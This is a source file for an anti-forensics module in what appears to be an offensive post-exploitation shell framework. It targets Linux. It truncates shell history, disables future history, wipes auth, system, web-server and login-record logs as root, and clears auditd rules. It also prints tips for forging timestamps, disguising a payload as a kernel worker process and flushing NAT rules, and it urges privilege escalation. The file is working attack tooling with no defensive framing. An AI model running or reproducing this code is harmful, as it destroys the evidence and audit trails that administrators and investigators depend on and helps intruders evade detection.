// @name: anti_forensics
// @description: Anti-forensics cleanup - logs, history, timestamps
// @category: post
// @target_os: linux
// @author: clawsh
// @version: 1.0

let output = "=== Anti-Forensics Cleanup ===\n";
let actions = 0;

// --- Current user ---
let whoami = exec_cmd("whoami 2>/dev/null");
output += "\n\x1b[2mRunning as: " + whoami.trim() + "\x1b[0m\n";

// --- Shell history cleanup ---
output += "\n\x1b[1;4mShell History:\x1b[0m\n";

let history_files = [
    "~/.bash_history",
    "~/.zsh_history", 
    "~/.history",
    "~/.sh_history",
    "/root/.bash_history",
    "/root/.zsh_history"
];

let history_cleared = 0;
for hf in history_files {
    let check = exec_cmd("test -f " + hf + " && echo EXISTS 2>/dev/null");
    if check.contains("EXISTS") {
        let clear = exec_cmd("truncate -s 0 " + hf + " 2>/dev/null && echo OK || echo FAIL");
        if clear.contains("OK") {
            output += "  \x1b[32m✓ Cleared:\x1b[0m " + hf + "\n";
            history_cleared += 1;
        } else {
            output += "  \x1b[33m✗ Failed:\x1b[0m " + hf + "\n";
        }
    }
}
if history_cleared == 0 {
    output += "  (no history files found or writable)\n";
}
actions += history_cleared;

// --- Disable history for current session ---
output += "\n\x1b[1;4mDisable Future History:\x1b[0m\n";
let disable_hist = exec_cmd("unset HISTFILE; export HISTSIZE=0; export HISTFILESIZE=0; echo OK 2>/dev/null");
if disable_hist.contains("OK") {
    output += "  \x1b[32m✓ History disabled for session\x1b[0m\n";
    output += "  \x1b[2m  Add to ~/.bashrc: export HISTSIZE=0 HISTFILESIZE=0\x1b[0m\n";
}

// --- System logs (requires root) ---
output += "\n\x1b[1;4mSystem Logs:\x1b[0m\n";

let log_files = [
    "/var/log/auth.log",
    "/var/log/auth.log.1",
    "/var/log/secure",
    "/var/log/secure.1",
    "/var/log/wtmp",
    "/var/log/btmp",
    "/var/run/utmp",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/kern.log",
    "/var/log/cron",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log"
];

let logs_cleared = 0;
let is_root = whoami.trim() == "root";

for lf in log_files {
    let check = exec_cmd("test -f " + lf + " && echo EXISTS 2>/dev/null");
    if check.contains("EXISTS") {
        if is_root {
            let clear = exec_cmd("truncate -s 0 " + lf + " 2>/dev/null && echo OK || echo FAIL");
            if clear.contains("OK") {
                output += "  \x1b[32m✓ Cleared:\x1b[0m " + lf + "\n";
                logs_cleared += 1;
            } else {
                output += "  \x1b[33m✗ Failed:\x1b[0m " + lf + "\n";
            }
        } else {
            output += "  \x1b[2m○ Skipped (need root):\x1b[0m " + lf + "\n";
        }
    }
}
actions += logs_cleared;

// --- Last login entries ---
output += "\n\x1b[1;4mLogin Records:\x1b[0m\n";
if is_root {
    let last_clear = exec_cmd("echo > /var/log/wtmp 2>/dev/null; echo > /var/log/btmp 2>/dev/null; echo > /var/run/utmp 2>/dev/null; echo OK");
    if last_clear.contains("OK") {
        output += "  \x1b[32m✓ Cleared wtmp, btmp, utmp\x1b[0m\n";
        actions += 1;
    }
} else {
    output += "  \x1b[2m○ Need root to clear wtmp/btmp/utmp\x1b[0m\n";
}

// --- Audit logs ---
output += "\n\x1b[1;4mAudit Logs:\x1b[0m\n";
if is_root {
    let audit = exec_cmd("service auditd status 2>/dev/null | head -1");
    if audit.len() > 0 {
        output += "  Audit daemon: " + audit.trim() + "\n";
        let audit_clear = exec_cmd("auditctl -D 2>/dev/null && echo OK || echo FAIL");
        if audit_clear.contains("OK") {
            output += "  \x1b[32m✓ Cleared audit rules\x1b[0m\n";
            actions += 1;
        }
    } else {
        output += "  (auditd not running)\n";
    }
} else {
    output += "  \x1b[2m○ Need root to manage audit\x1b[0m\n";
}

// --- Timestamp manipulation ---
output += "\n\x1b[1;4mTimestamps:\x1b[0m\n";
let touch_help = exec_cmd("touch --help 2>/dev/null | grep -i date | head -1");
if touch_help.len() > 0 {
    output += "  \x1b[2mUse 'touch -t YYYYMMDDhhmm <file>' to modify timestamps\x1b[0m\n";
    output += "  \x1b[2mUse 'touch -r <ref_file> <file>' to match reference\x1b[0m\n";
}

// --- Process hiding ---
output += "\n\x1b[1;4mProcess Hiding:\x1b[0m\n";
output += "  \x1b[2mRename process: exec -a '[kworker/0:0]' ./payload\x1b[0m\n";
output += "  \x1b[2mHide from ps: Start with space in name if possible\x1b[0m\n";

// --- Network traces ---
output += "\n\x1b[1;4mNetwork Traces:\x1b[0m\n";
let connections = exec_cmd("ss -tuapn 2>/dev/null | head -10");
if connections.len() > 0 {
    output += "  Current connections:\n";
    for line in connections.split("\n") {
        if line.len() > 0 {
            output += "    " + line + "\n";
        }
    }
}
output += "  \x1b[2mTip: Use 'iptables -t nat -F' to clear NAT rules (root)\x1b[0m\n";

// --- Summary ---
output += "\n\x1b[1;4mSummary:\x1b[0m\n";
output += "  Actions performed: " + actions.to_string() + "\n";

if !is_root {
    output += "\n  \x1b[33m⚠ Running as non-root, limited cleanup performed\x1b[0m\n";
    output += "  Consider escalating privileges for full cleanup\n";
} else {
    output += "\n  \x1b[32m✓ Running as root, full cleanup available\x1b[0m\n";
}

output += "\n  \x1b[2m⚠ Note: Forensic artifacts may still exist in:\x1b[0m\n";
output += "    - Journal logs (journalctl)\n";
output += "    - Memory (RAM)\n";
output += "    - Disk forensics (deleted file recovery)\n";
output += "    - Network monitoring (external)\n";
output += "    - Container logs (Docker/K8s)\n";

print_output(output);

let RESULT = actions.to_string() + " cleanup action(s) performed";